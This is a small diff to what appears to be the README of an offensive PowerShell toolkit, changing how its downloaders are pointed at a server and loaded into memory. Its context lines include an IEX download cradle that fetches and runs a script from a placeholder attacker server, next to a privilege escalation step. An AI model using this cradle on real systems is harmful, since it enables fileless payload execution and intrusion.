@@ -23,9 +23,10 @@ sudo python3 -m http.server 80
 ```
 IEX(new-object system.net.webclient).downloadstring("http://<your_server>/wisp.txt")
 ```
-* SET A SERVER URL FOR THE DOWNLOADERS
+* SET A SERVER URL FOR THE DOWNLOADERS & LOAD THE SCRIPTS
 ```
-Invoke-Wisp -Url 'http://<your_server>/'
+Invoke-Wisp -Url http://<your_server>
+. memory_load
 ```
 * PRIVILEGE ESCALATION ENUMERATION
 ```
